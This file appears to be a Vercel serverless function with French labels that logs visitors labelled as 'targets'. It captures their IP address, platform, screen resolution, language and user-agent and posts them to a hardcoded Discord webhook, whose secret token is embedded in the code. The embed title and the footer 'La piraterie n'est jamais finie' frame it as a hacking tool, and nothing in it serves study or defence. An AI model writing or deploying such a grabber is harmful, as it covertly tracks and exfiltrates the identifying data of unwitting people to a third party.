export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1500102542200410225/9u18sYNG-fwv_ywOSNutXFYSATfjLi5yO-XP8qKAJmWYwzKvRKSSGIY75Y7upZbbiscc';
    
    // Récupération de l'IP via les headers Vercel
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const body = req.body;

    const payload = {
        embeds: [{
            title: "🚀 Nouvelle cible vérifiée",
            color: 0xff0000,
            fields: [
                { name: "🌐 Adresse IP", value: `\`${ip}\``, inline: true },
                { name: "📱 Plateforme", value: `\`${body.platform}\``, inline: true },
                { name: "🖥️ Résolution", value: `\`${body.screenRes}\``, inline: true },
                { name: "🌍 Langue", value: `\`${body.language}\``, inline: true },
                { name: "🔍 User-Agent", value: `\`\`\`${body.userAgent}\`\`\`` }
            ],
            footer: { text: "La piraterie n'est jamais finie" },
            timestamp: new Date()
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        return res.status(200).json({ status: 'success' });
    } catch (err) {
        return res.status(500).json({ error: 'Failed to send webhook' });
    }
}
